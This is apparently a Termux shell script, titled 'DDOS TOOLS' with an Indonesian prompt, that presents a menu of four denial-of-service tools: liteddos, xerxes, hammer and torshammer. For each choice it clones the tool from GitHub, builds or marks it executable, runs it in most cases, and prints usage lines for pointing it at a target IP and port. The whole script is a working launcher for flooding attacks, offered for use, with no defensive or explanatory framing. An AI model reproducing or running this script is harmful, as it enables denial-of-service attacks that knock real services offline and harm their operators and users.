e="\033[1;31m"
w="\033[1;33m"
q="\033[1;32m"

mun_banner(){
 clear
echo -e $w"(^0^)*****************************************************(^0^)"
echo -e $e"(^0^)=====================================================(^0^)"
echo -e $w"(^0^)      (termux.id)   DDOS TOOLS  (by.mr.notfound)     (^0^)"
echo -e $e"(^0^)=====================================================(^0^)"
echo -e $e"(^0^)=====================================================(^0^)"
echo -e $q"(^0^)#####################################################(^0^)"
mimin
}
mimin(){
echo -e $w" [1]  liteddos "
echo -e $e" [2]  xerxes "
echo -e $q" [3]  hammer "
echo -e $w" [4]  torshammer "
echo -e -n $e " Pilih Nomor Pilihan Anda => "
read mumun
if [[ $mumun == "1" ]]; then
apt update
apt upgrade
pkg install git
pkg install python2

git clone https://github.com/4L13199/LITEDDOS

ls
cd LITEDDOS
ls
chmod +x LITEDDOS.py
python2 LITEDDOS.py
elif [[ $mumun == "2" ]]; then
 apt update
 apt upgrade
apt install git
apt install clang

git clone https://github.com/zanyarjamal/xerxes

ls
cd xerxes
ls
clang xerxes.c -o xerxes
ls

echo "Ketik ./xerxes (target kalian) 80"
elif [[ $mumun == "3" ]]; then
apt update
apt upgrade
pkg install python
pkg install git

git clone https://github.com/cyweb/hammer

ls

cd hammer

chmod 7777 hammer.py

ls

python hammer.py
echo "cara gunakan ketik python hammer.py -s (alamat IP yg akan diserang) -p 80 -t 135"
elif [[ $mumun == "4" ]]; then
pkg update
pkg install git
apt install tor
pkg install python2
git clone https://github.com/dotfighter/torshammer.git
ls
cd torshammer
python2 torshammer.py
echo "cara gunakan ketik python2 torshammer.py -t (ip target) -p (port target) -r 1000"

  #statements
  #statements
  #statements
  #statements
  #statements
  #statements
fi
}
mun_banner